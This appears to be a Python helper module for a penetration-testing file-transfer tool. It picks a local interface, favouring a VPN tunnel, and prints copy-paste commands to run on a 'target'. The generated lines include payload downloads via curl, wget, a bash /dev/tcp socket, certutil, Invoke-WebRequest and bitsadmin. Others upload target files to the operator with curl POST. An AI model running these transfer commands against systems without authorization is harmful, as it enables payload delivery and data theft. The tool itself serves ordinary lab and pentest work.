"""Local IP detection and interface picker."""

import re
import subprocess
import sys
from urllib.parse import urlparse


def get_all_interfaces() -> list[tuple[str, str]]:
    """Return list of (interface_name, ipv4) excluding lo."""
    out = subprocess.run(
        ["ip", "-4", "addr", "show"],
        capture_output=True,
        text=True,
        timeout=2,
    )
    if out.returncode != 0:
        return []
    current_iface = None
    result = []
    for line in out.stdout.splitlines():
        if line and not line[0].isspace():
            parts = line.split(":", 2)
            current_iface = parts[1].strip() if len(parts) > 1 else None
        if current_iface and current_iface != "lo":
            m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)", line)
            if m:
                result.append((current_iface, m.group(1)))
    return result


def _pick_interface_fzf(choices: list[tuple[str, str]]) -> str | None:
    """Use fzf to pick one; return selected ip or None."""
    lines = [f"{name}  {ip}" for name, ip in choices]
    try:
        p = subprocess.run(
            ["fzf", "--height", "10", "-1"],
            input="\n".join(lines),
            capture_output=True,
            text=True,
            timeout=30,
        )
        if p.returncode != 0 or not p.stdout.strip():
            return None
        selected = p.stdout.strip()
        for name, ip in choices:
            if f"{name}  {ip}" == selected or ip == selected:
                return ip
        if re.match(r"^\d+\.\d+\.\d+\.\d+$", selected):
            return selected
        parts = selected.split()
        return parts[-1] if parts and re.match(r"^\d+\.\d+\.\d+\.\d+$", parts[-1]) else None
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return None


def _pick_interface_menu(choices: list[tuple[str, str]]) -> str | None:
    """Numbered menu on stderr; return selected ip or None."""
    for i, (name, ip) in enumerate(choices, 1):
        sys.stderr.write(f"  {i}) {name}  {ip}\n")
    sys.stderr.write("  choice (1-{}): ".format(len(choices)))
    sys.stderr.flush()
    try:
        line = input().strip()
        idx = int(line)
        if 1 <= idx <= len(choices):
            return choices[idx - 1][1]
    except (ValueError, EOFError):
        pass
    return None


def pick_platform() -> str | None:
    """Fuzzy pick Windows or Linux; return 'windows' or 'linux', or None to show both."""
    if not sys.stderr.isatty():
        return None
    choices = [("Windows", "windows"), ("Linux", "linux")]
    lines = [label for label, _ in choices]
    try:
        p = subprocess.run(
            ["fzf", "--height", "5", "-1", "--prompt", "platform: "],
            input="\n".join(lines),
            capture_output=True,
            text=True,
            timeout=30,
        )
        if p.returncode != 0 or not p.stdout.strip():
            return None
        selected = p.stdout.strip().lower()
        if selected == "windows":
            return "windows"
        if selected == "linux":
            return "linux"
        return None
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass
    sys.stderr.write("\n  platform: 1) Windows  2) Linux  [1/2]: ")
    sys.stderr.flush()
    try:
        line = input().strip() or "1"
        if line == "2":
            return "linux"
        return "windows"
    except EOFError:
        return None


def pick_interface() -> str | None:
    """Show fuzzy finder or menu to select interface; return its IPv4 or None."""
    choices = get_all_interfaces()
    if not choices:
        return None
    if len(choices) == 1:
        return choices[0][1]
    if not sys.stderr.isatty():
        return get_local_ip()
    sys.stderr.write("\n  select interface (for command box):\n")
    return _pick_interface_fzf(choices) or _pick_interface_menu(choices)


def get_local_ip() -> str | None:
    """Return preferred local IPv4 (tun0 first, then first non-lo), or None."""
    ifaces = get_all_interfaces()
    for name, ip in ifaces:
        if name == "tun0":
            return ip
    return ifaces[0][1] if ifaces else None


def _port_proto(port: int, protocol: str) -> tuple[str, str]:
    port_opt = "" if port == 80 else f" -p {port}"
    proto_opt = "" if protocol == "http" else f" --protocol {protocol}"
    return port_opt, proto_opt


def _base_url(ip: str, port: int) -> str:
    scheme = "https" if port == 443 else "http"
    if port in (80, 443):
        return f"{scheme}://{ip}"
    return f"{scheme}://{ip}:{port}"


def _target_receive_linux(base: str, path: str = "/path/to/file", out: str = "/tmp/payload.bin") -> str:
    p = urlparse(base)
    host, port = p.hostname or "YOUR_IP", p.port or (443 if p.scheme == "https" else 80)
    dev_tcp = f"exec 3<>/dev/tcp/{host}/{port}; echo -e \"GET {path} HTTP/1.0\\n\\n\" >&3; cat <&3 > {out}"
    return f"curl -o {out} {base}{path}\nwget -O {out} {base}{path}\n{dev_tcp}"


def _target_receive_win(base: str, path: str = "/path/to/file", out: str = "out") -> str:
    url = f"{base}{path}"
    iwr = f'iwr -Uri "{url}" -OutFile "{out}"'
    bits = f'bitsadmin /transfer job /download /priority high "{url}" "{out}"'
    return f"curl -o {out} {url}\ncertutil -urlcache -split -f {url} {out}\n{iwr}\n{bits}"


def _target_send_linux(base: str, path: str = "./file", name: str = "file") -> str:
    return f"curl -X POST --data-binary @{path} {base}/{name}"


def _target_send_win(base: str, path: str = "file", name: str = "file") -> str:
    return f"curl -X POST --data-binary @{path} {base}/{name}"


_WIDTH = 56


def _box_line(text: str) -> str:
    return "  |  " + text.ljust(_WIDTH) + "  |\n"


def _section(title: str, lines: list[str]) -> str:
    out = ["", f"  {title}", "  " + "-" * (len(title) + 2)]
    for line in lines:
        out.append(f"  {line}")
    return "\n".join(out) + "\n"


def print_commands_serve(port: int, protocol: str = "http") -> None:
    """Print copy-paste commands for target (curl/wget/certutil/iwr/bitsadmin) when we are serving."""
    platform = pick_platform()
    my_ip = pick_interface()
    if not my_ip or protocol != "http":
        return
    base = _base_url(my_ip, port)
    sys.stderr.write("\n")
    sys.stderr.write("  +" + "-" * (_WIDTH + 4) + "+\n")
    sys.stderr.write(_box_line("run on target (copy-paste)"))
    sys.stderr.write("  +" + "-" * (_WIDTH + 4) + "+\n")
    if platform in (None, "linux"):
        recv_linux = _target_receive_linux(base).split("\n")
        send_linux = _target_send_linux(base).split("\n")
        sys.stderr.write(_section("linux: receive from you", recv_linux))
        sys.stderr.write(_section("linux: send to you", send_linux))
    if platform in (None, "windows"):
        recv_win = _target_receive_win(base).split("\n")
        send_win = _target_send_win(base).split("\n")
        sys.stderr.write(_section("windows: receive from you", recv_win))
        sys.stderr.write(_section("windows: send to you", send_win))
    sys.stderr.write("\n")


def print_commands_receive_listen(port: int, protocol: str = "http") -> None:
    """Print copy-paste for target to POST file to you (host is listening)."""
    platform = pick_platform()
    my_ip = pick_interface()
    if not my_ip or protocol != "http":
        return
    base = _base_url(my_ip, port)
    sys.stderr.write("\n")
    sys.stderr.write("  +" + "-" * (_WIDTH + 4) + "+\n")
    sys.stderr.write(_box_line("run on target (POST file to you)"))
    sys.stderr.write("  +" + "-" * (_WIDTH + 4) + "+\n")
    if platform in (None, "linux"):
        send_linux = _target_send_linux(base).split("\n")
        sys.stderr.write(_section("linux", send_linux))
    if platform in (None, "windows"):
        send_win = _target_send_win(base).split("\n")
        sys.stderr.write(_section("windows", send_win))
    sys.stderr.write("\n")
